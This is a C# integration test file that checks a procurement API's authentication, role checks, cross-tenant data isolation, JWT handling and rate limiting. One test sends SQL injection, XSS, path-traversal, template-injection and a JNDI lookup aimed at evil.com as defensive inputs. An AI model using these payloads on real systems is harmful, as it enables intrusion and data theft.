using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.Extensions.DependencyInjection;
using ProcurementPlanner.API.Models;
using ProcurementPlanner.Core.Entities;
using ProcurementPlanner.Core.Models;
using ProcurementPlanner.Infrastructure.Data;
using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Xunit;
using FluentAssertions;
using System.Net.Http.Headers;

namespace ProcurementPlanner.Tests.Integration;

/// <summary>
/// Comprehensive security and authorization tests for all API endpoints
/// </summary>
public class SecurityAndAuthorizationTests : IClassFixture<WebApplicationFactory<Program>>, IAsyncLifetime
{
    private readonly WebApplicationFactory<Program> _factory;
    private readonly HttpClient _client;
    private readonly JsonSerializerOptions _jsonOptions;
    private ApplicationDbContext _context;
    private TestDataManager _testDataManager;

    public SecurityAndAuthorizationTests(WebApplicationFactory<Program> factory)
    {
        _factory = factory;
        _client = _factory.CreateClient();
        _jsonOptions = new JsonSerializerOptions
        {
            PropertyNamingPolicy = JsonNamingPolicy.CamelCase
        };
    }

    public async Task InitializeAsync()
    {
        var scope = _factory.Services.CreateScope();
        _context = scope.ServiceProvider.GetRequiredService<ApplicationDbContext>();
        _testDataManager = new TestDataManager(_context);
        
        await _context.Database.EnsureDeletedAsync();
        await _context.Database.EnsureCreatedAsync();
        await _testDataManager.SeedComprehensiveTestDataAsync();
    }

    public async Task DisposeAsync()
    {
        await _testDataManager.CleanupTestDataAsync();
        await _context.Database.EnsureDeletedAsync();
        _context?.Dispose();
        _client?.Dispose();
    }

    [Theory]
    [InlineData("/api/order", "GET")]
    [InlineData("/api/order", "POST")]
    [InlineData("/api/order/dashboard", "GET")]
    [InlineData("/api/procurement/suggestions/00000000-0000-0000-0000-000000000000", "GET")]
    [InlineData("/api/procurement/purchase-orders", "POST")]
    [InlineData("/api/supplier", "GET")]
    [InlineData("/api/supplier", "POST")]
    [InlineData("/api/audit", "GET")]
    [InlineData("/api/reporting/performance", "GET")]
    public async Task ProtectedEndpoints_WithoutAuthentication_ShouldReturnUnauthorized(string endpoint, string method)
    {
        // Arrange
        _client.DefaultRequestHeaders.Authorization = null;

        // Act
        HttpResponseMessage response = method.ToUpper() switch
        {
            "GET" => await _client.GetAsync(endpoint),
            "POST" => await _client.PostAsync(endpoint, new StringContent("{}", System.Text.Encoding.UTF8, "application/json")),
            "PUT" => await _client.PutAsync(endpoint, new StringContent("{}", System.Text.Encoding.UTF8, "application/json")),
            "DELETE" => await _client.DeleteAsync(endpoint),
            _ => throw new ArgumentException($"Unsupported HTTP method: {method}")
        };

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.Unauthorized, 
            $"Endpoint {method} {endpoint} should require authentication");
    }

    [Theory]
    [InlineData("/api/order", "POST", UserRole.Supplier)]
    [InlineData("/api/order", "POST", UserRole.Customer)]
    [InlineData("/api/procurement/suggestions/00000000-0000-0000-0000-000000000000", "GET", UserRole.Supplier)]
    [InlineData("/api/procurement/suggestions/00000000-0000-0000-0000-000000000000", "GET", UserRole.Customer)]
    [InlineData("/api/procurement/purchase-orders", "POST", UserRole.Supplier)]
    [InlineData("/api/procurement/purchase-orders", "POST", UserRole.Customer)]
    [InlineData("/api/supplier", "POST", UserRole.Supplier)]
    [InlineData("/api/supplier", "POST", UserRole.Customer)]
    [InlineData("/api/audit", "GET", UserRole.Supplier)]
    [InlineData("/api/audit", "GET", UserRole.Customer)]
    public async Task PlannerOnlyEndpoints_WithWrongRole_ShouldReturnForbidden(string endpoint, string method, UserRole wrongRole)
    {
        // Arrange
        var token = await GetAuthTokenAsync(wrongRole);
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);

        var testContent = method == "POST" ? new StringContent("{}", System.Text.Encoding.UTF8, "application/json") : null;

        // Act
        HttpResponseMessage response = method.ToUpper() switch
        {
            "GET" => await _client.GetAsync(endpoint),
            "POST" => await _client.PostAsync(endpoint, testContent),
            "PUT" => await _client.PutAsync(endpoint, testContent),
            "DELETE" => await _client.DeleteAsync(endpoint),
            _ => throw new ArgumentException($"Unsupported HTTP method: {method}")
        };

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.Forbidden, 
            $"Endpoint {method} {endpoint} should be forbidden for role {wrongRole}");
    }

    [Fact]
    public async Task SupplierEndpoints_WithSupplierRole_ShouldAllowAccess()
    {
        // Arrange
        var supplierToken = await GetAuthTokenAsync(UserRole.Supplier);
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", supplierToken);

        var testSupplierId = await GetTestSupplierIdAsync();

        // Act & Assert - Supplier should be able to access their own purchase orders
        var supplierPOsResponse = await _client.GetAsync($"/api/procurement/supplier/{testSupplierId}/purchase-orders");
        supplierPOsResponse.StatusCode.Should().BeOneOf(HttpStatusCode.OK, HttpStatusCode.NotFound);

        // Supplier should be able to view their own supplier details
        var supplierDetailsResponse = await _client.GetAsync($"/api/supplier/{testSupplierId}");
        supplierDetailsResponse.StatusCode.Should().BeOneOf(HttpStatusCode.OK, HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task SupplierDataIsolation_ShouldPreventCrossSupplierAccess()
    {
        // Arrange
        var scenario = await _testDataManager.CreateCompleteTestScenarioAsync();
        var supplier1Token = await GetAuthTokenAsync(UserRole.Supplier, "supplier1@test.com");
        var supplier2Token = await GetAuthTokenAsync(UserRole.Supplier, "supplier2@test.com");

        var supplier1Id = scenario.TestSuppliers[0].Id;
        var supplier2Id = scenario.TestSuppliers[1].Id;

        // Act & Assert - Supplier 1 should not access Supplier 2's data
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", supplier1Token);
        
        var unauthorizedResponse = await _client.GetAsync($"/api/procurement/supplier/{supplier2Id}/purchase-orders");
        unauthorizedResponse.StatusCode.Should().Be(HttpStatusCode.Forbidden, 
            "Supplier should not access another supplier's purchase orders");

        var unauthorizedSupplierResponse = await _client.GetAsync($"/api/supplier/{supplier2Id}");
        unauthorizedSupplierResponse.StatusCode.Should().Be(HttpStatusCode.Forbidden,
            "Supplier should not access another supplier's details");

        // Supplier 1 should access their own data
        var authorizedResponse = await _client.GetAsync($"/api/procurement/supplier/{supplier1Id}/purchase-orders");
        authorizedResponse.StatusCode.Should().BeOneOf(HttpStatusCode.OK, HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task CustomerDataIsolation_ShouldPreventCrossCustomerAccess()
    {
        // Arrange
        var scenario = await _testDataManager.CreateCompleteTestScenarioAsync();
        var customer1Token = await GetAuthTokenAsync(UserRole.Customer, "customer1@test.com");
        var customer2Token = await GetAuthTokenAsync(UserRole.Customer, "customer2@test.com");

        var customer1Order = scenario.CustomerOrders[0];
        var customer2Order = scenario.CustomerOrders[1];

        // Act & Assert - Customer 1 should not access Customer 2's orders
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", customer1Token);
        
        var unauthorizedResponse = await _client.GetAsync($"/api/customer-order-tracking/{customer2Order.Id}");
        unauthorizedResponse.StatusCode.Should().Be(HttpStatusCode.Forbidden,
            "Customer should not access another customer's order");

        // Customer 1 should access their own orders
        var authorizedResponse = await _client.GetAsync($"/api/customer-order-tracking/{customer1Order.Id}");
        authorizedResponse.StatusCode.Should().BeOneOf(HttpStatusCode.OK, HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task AdminRole_ShouldHaveFullAccess()
    {
        // Arrange
        var adminToken = await GetAuthTokenAsync(UserRole.Administrator);
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", adminToken);

        var testSupplierId = await GetTestSupplierIdAsync();

        // Act & Assert - Admin should access all endpoints
        var endpoints = new[]
        {
            "/api/order",
            "/api/order/dashboard",
            "/api/supplier",
            $"/api/supplier/{testSupplierId}",
            $"/api/procurement/supplier/{testSupplierId}/purchase-orders",
            "/api/audit",
            "/api/reporting/performance"
        };

        foreach (var endpoint in endpoints)
        {
            var response = await _client.GetAsync(endpoint);
            response.StatusCode.Should().BeOneOf(HttpStatusCode.OK, HttpStatusCode.NotFound, HttpStatusCode.BadRequest,
                $"Admin should have access to {endpoint}");
            response.StatusCode.Should().NotBe(HttpStatusCode.Unauthorized);
            response.StatusCode.Should().NotBe(HttpStatusCode.Forbidden);
        }
    }

    [Fact]
    public async Task JwtTokenValidation_WithInvalidToken_ShouldReturnUnauthorized()
    {
        // Arrange
        var invalidTokens = new[]
        {
            "invalid-token",
            "Bearer invalid-token",
            "",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature", // Malformed JWT
            "expired-token-that-looks-valid-but-is-not"
        };

        foreach (var invalidToken in invalidTokens)
        {
            // Act
            _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", invalidToken);
            var response = await _client.GetAsync("/api/order");

            // Assert
            response.StatusCode.Should().Be(HttpStatusCode.Unauthorized,
                $"Invalid token '{invalidToken}' should result in unauthorized access");
        }
    }

    [Fact]
    public async Task TokenExpiration_ShouldBeEnforced()
    {
        // Arrange
        var expiredToken = GenerateExpiredJwtToken();
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", expiredToken);

        // Act
        var response = await _client.GetAsync("/api/order");

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.Unauthorized,
            "Expired token should result in unauthorized access");
    }

    [Fact]
    public async Task InputValidation_ShouldPreventInjectionAttacks()
    {
        // Arrange
        var plannerToken = await GetAuthTokenAsync(UserRole.LMRPlanner);
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", plannerToken);

        var maliciousInputs = new[]
        {
            "'; DROP TABLE Users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%3Cscript%3Ealert('xss')%3C/script%3E"
        };

        foreach (var maliciousInput in maliciousInputs)
        {
            // Test SQL injection in query parameters
            var queryResponse = await _client.GetAsync($"/api/order?customerId={maliciousInput}");
            queryResponse.StatusCode.Should().BeOneOf(HttpStatusCode.BadRequest, HttpStatusCode.OK,
                $"Malicious query input '{maliciousInput}' should be handled safely");

            // Test XSS in POST body
            var maliciousOrder = new CreateOrderDto
            {
                CustomerId = maliciousInput,
                CustomerName = maliciousInput,
                ProductType = ProductType.LMR,
                RequestedDeliveryDate = DateTime.UtcNow.AddDays(7),
                Items = new List<CreateOrderItemDto>
                {
                    new()
                    {
                        ProductCode = maliciousInput,
                        Description = maliciousInput,
                        Quantity = 1,
                        Unit = "EA",
                        UnitPrice = 1.00m
                    }
                }
            };

            var postResponse = await _client.PostAsJsonAsync("/api/order", maliciousOrder, _jsonOptions);
            postResponse.StatusCode.Should().BeOneOf(HttpStatusCode.BadRequest, HttpStatusCode.Created,
                $"Malicious POST input '{maliciousInput}' should be handled safely");
        }
    }

    [Fact]
    public async Task RateLimiting_ShouldPreventAbuse()
    {
        // Arrange
        var plannerToken = await GetAuthTokenAsync(UserRole.LMRPlanner);
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", plannerToken);

        // Act - Make many rapid requests
        var tasks = new List<Task<HttpResponseMessage>>();
        for (int i = 0; i < 100; i++)
        {
            tasks.Add(_client.GetAsync("/api/order/dashboard"));
        }

        var responses = await Task.WhenAll(tasks);

        // Assert - Some requests should be rate limited (429 Too Many Requests)
        // Note: This test assumes rate limiting is implemented
        var rateLimitedResponses = responses.Count(r => r.StatusCode == HttpStatusCode.TooManyRequests);
        var successfulResponses = responses.Count(r => r.StatusCode == HttpStatusCode.OK);

        // At least some requests should succeed, but excessive requests should be limited
        successfulResponses.Should().BeGreaterThan(0, "Some requests should succeed");
        
        // If rate limiting is implemented, some should be limited
        // If not implemented, all should succeed (which is also acceptable for this test)
        (rateLimitedResponses > 0 || successfulResponses == 100).Should().BeTrue(
            "Either rate limiting should be active or all requests should succeed");
    }

    [Fact]
    public async Task SensitiveDataExposure_ShouldBePreventedInResponses()
    {
        // Arrange
        var plannerToken = await GetAuthTokenAsync(UserRole.LMRPlanner);
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", plannerToken);

        // Act - Get various API responses
        var responses = new[]
        {
            await _client.GetAsync("/api/order"),
            await _client.GetAsync("/api/supplier"),
            await _client.GetAsync("/api/order/dashboard")
        };

        // Assert - Check that sensitive data is not exposed
        var sensitivePatterns = new[]
        {
            "password",
            "secret",
            "key",
            "token",
            "connectionstring",
            "apikey"
        };

        foreach (var response in responses.Where(r => r.IsSuccessStatusCode))
        {
            var content = await response.Content.ReadAsStringAsync();
            content = content.ToLowerInvariant();

            foreach (var pattern in sensitivePatterns)
            {
                content.Should().NotContain(pattern,
                    $"API response should not contain sensitive data pattern '{pattern}'");
            }
        }
    }

    [Fact]
    public async Task ConcurrentAccess_ShouldMaintainSecurity()
    {
        // Arrange
        var plannerToken = await GetAuthTokenAsync(UserRole.LMRPlanner);
        var supplierToken = await GetAuthTokenAsync(UserRole.Supplier);

        // Act - Simulate concurrent access from different roles
        var plannerTasks = new List<Task<HttpResponseMessage>>();
        var supplierTasks = new List<Task<HttpResponseMessage>>();

        for (int i = 0; i < 10; i++)
        {
            // Planner tasks
            var plannerClient = _factory.CreateClient();
            plannerClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", plannerToken);
            plannerTasks.Add(plannerClient.GetAsync("/api/order"));

            // Supplier tasks
            var supplierClient = _factory.CreateClient();
            supplierClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", supplierToken);
            var testSupplierId = await GetTestSupplierIdAsync();
            supplierTasks.Add(supplierClient.GetAsync($"/api/procurement/supplier/{testSupplierId}/purchase-orders"));
        }

        var allTasks = plannerTasks.Concat(supplierTasks);
        var responses = await Task.WhenAll(allTasks);

        // Assert - All responses should maintain proper authorization
        var plannerResponses = responses.Take(10).ToArray();
        var supplierResponses = responses.Skip(10).ToArray();

        plannerResponses.Should().AllSatisfy(r => 
            r.StatusCode.Should().BeOneOf(HttpStatusCode.OK, HttpStatusCode.NotFound, HttpStatusCode.BadRequest),
            "Planner requests should succeed");

        supplierResponses.Should().AllSatisfy(r => 
            r.StatusCode.Should().BeOneOf(HttpStatusCode.OK, HttpStatusCode.NotFound, HttpStatusCode.BadRequest),
            "Supplier requests should succeed");

        // Clean up clients
        foreach (var task in plannerTasks.Concat(supplierTasks))
        {
            task.Result.Dispose();
        }
    }

    // Helper methods
    private async Task<string> GetAuthTokenAsync(UserRole role, string email = null)
    {
        // In a real implementation, this would authenticate against your auth service
        // For testing, we'll create a mock JWT token or use a test authentication scheme
        
        email ??= role switch
        {
            UserRole.Administrator => "admin@test.com",
            UserRole.LMRPlanner => "planner@test.com",
            UserRole.Supplier => "supplier@test.com",
            UserRole.Customer => "customer@test.com",
            _ => "test@test.com"
        };

        var loginRequest = new
        {
            Email = email,
            Password = "password123"
        };

        try
        {
            var response = await _client.PostAsJsonAsync("/api/auth/login", loginRequest);
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                var authResponse = JsonSerializer.Deserialize<LoginResponse>(content, _jsonOptions);
                return authResponse?.Token ?? GenerateMockJwtToken(role, email);
            }
        }
        catch
        {
            // If auth fails, return a mock token for testing
        }

        return GenerateMockJwtToken(role, email);
    }

    private string GenerateMockJwtToken(UserRole role, string email)
    {
        // Generate a mock JWT token for testing
        // In a real implementation, this would be a valid JWT with proper claims
        var payload = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(
            $"{{\"sub\":\"{email}\",\"role\":\"{role}\",\"exp\":{DateTimeOffset.UtcNow.AddHours(1).ToUnixTimeSeconds()}}}"));
        
        return $"mock.{payload}.signature";
    }

    private string GenerateExpiredJwtToken()
    {
        // Generate a mock expired JWT token
        var payload = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(
            $"{{\"sub\":\"test@test.com\",\"role\":\"LMRPlanner\",\"exp\":{DateTimeOffset.UtcNow.AddHours(-1).ToUnixTimeSeconds()}}}"));
        
        return $"expired.{payload}.signature";
    }

    private async Task<Guid> GetTestSupplierIdAsync()
    {
        var supplier = await _context.Suppliers.FirstOrDefaultAsync();
        return supplier?.Id ?? Guid.NewGuid();
    }
}